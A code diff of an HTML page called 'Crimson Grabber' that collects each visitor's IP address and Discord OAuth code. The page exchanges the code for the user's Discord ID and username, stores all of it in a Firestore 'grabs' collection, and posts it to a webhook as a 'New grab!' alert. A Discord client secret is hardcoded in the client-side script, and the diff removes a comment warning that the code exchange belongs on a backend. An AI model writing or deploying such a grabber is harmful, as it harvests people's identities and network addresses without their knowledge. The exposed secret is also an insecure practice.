@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Crimson Grabber</title>
   <style>
     body { font-family: sans-serif; text-align: center; padding: 2rem; }
@@ -85,7 +85,6 @@
       let res = await fetch('https://api.ipify.org?format=json');
       let data = await res.json();
       userIP = data.ip;
-      // console.log('IP =', userIP);
     } catch (e) {
       console.warn('Failed to get IP:', e);
       userIP = 'unknown';
@@ -119,8 +118,6 @@
       return;  // fresh load
     }
     const code = params.get('code');
-    // NOTE: for real security, exchange this code on your backend.
-    // Here we pretend it worked.
     show('load-screen');
     await compileAndExport(code);
   }
@@ -144,75 +141,75 @@
 
   // ────────────────────────────────────────────────────────
   //  4. compile data → Firebase, then webhook
-async function compileAndExport(oauthCode) {
-  let discordUserId = 'unknown';
-  let discordUsername = 'unknown';
+  async function compileAndExport(oauthCode) {
+    let discordUserId = 'unknown';
+    let discordUsername = 'unknown';
 
-  try {
-    const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded'
-      },
-      body: new URLSearchParams({
-        client_id: DISCORD_CLIENT_ID,
-        client_secret: 'qpfyIPK3yAhuSPEKEMdLUKNxakJek_J6', 
-        grant_type: 'authorization_code',
-        code: oauthCode,
-        redirect_uri: REDIRECT_URI,
-        scope: 'identify'
-      })
-    });
-    const tokenData = await tokenResponse.json();
-
-    if (tokenData.access_token) {
-      // Fetch user info
-      const userResponse = await fetch('https://discord.com/api/users/@me', {
+    try {
+      // Exchange code for access token
+      const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
+        method: 'POST',
         headers: {
-          'Authorization': `Bearer ${tokenData.access_token}`
-        }
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: new URLSearchParams({
+          client_id: DISCORD_CLIENT_ID,
+          client_secret: 'qpfyIPK3yAhuSPEKEMdLUKNxakJek_J6', // Replace with your secret
+          grant_type: 'authorization_code',
+          code: oauthCode,
+          redirect_uri: REDIRECT_URI,
+          scope: 'identify'
+        })
       });
-      const userData = await userResponse.json();
-      discordUserId = userData.id;
-      discordUsername = `${userData.username}#${userData.discriminator}`;
-    } else {
-      console.warn('Failed to get access token:', tokenData);
+      const tokenData = await tokenResponse.json();
+      if (tokenData.access_token) {
+        // Fetch user info
+        const userResponse = await fetch('https://discord.com/api/users/@me', {
+          headers: {
+            'Authorization': `Bearer ${tokenData.access_token}`
+          }
+        });
+        const userData = await userResponse.json();
+        discordUserId = userData.id;
+        discordUsername = `${userData.username}#${userData.discriminator}`;
+      } else {
+        console.warn('Failed to get access token:', tokenData);
+      }
+    } catch (e) {
+      console.error('Error fetching Discord user info:', e);
     }
-  } catch (e) {
-    console.error('Error fetching Discord user info:', e);
-  }
 
-  // Save to Firebase
-  try {
-    await db.collection('grabs').add({
-      ip: userIP,
-      code: oauthCode,
-      discordUserId: discordUserId,
-      discordUsername: discordUsername,
-      ts: new Date()
-    });
-  } catch (e) {
-    console.error('Firestore error', e);
-  }
+    // Save to Firebase
+    try {
+      await db.collection('grabs').add({
+        ip: userIP,
+        code: oauthCode,
+        discordUserId: discordUserId,
+        discordUsername: discordUsername,
+        ts: new Date()
+      });
+    } catch (e) {
+      console.error('Firestore error', e);
+    }
 
-  // Send data to Discord webhook
-  try {
-    await fetch(DISCORD_WEBHOOK, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        content: `New grab!\nIP: ${userIP}\nCode: ${oauthCode}\nDiscord ID: ${discordUserId}\nDiscord Username: ${discordUsername}`
-      })
-    });
-  } catch (e) {
-    console.error('Webhook error', e);
-    return showErrorAndClose();
-  }
+    // Send data to Discord webhook
+    try {
+      await fetch(DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `New grab!\nIP: ${userIP}\nCode: ${oauthCode}\nDiscord ID: ${discordUserId}\nDiscord Username: ${discordUsername}`
+        })
+      });
+    } catch (e) {
+      console.error('Webhook error', e);
+      return showErrorAndClose();
+    }
 
-  // Final message
-  show('final-screen');
-  setTimeout(() => window.close(), 3000);
-}
+    // Final message
+    show('final-screen');
+    setTimeout(() => window.close(), 3000);
+  }
 
   // ────────────────────────────────────────────────────────
   //  5. error path → “Retry in 24h”
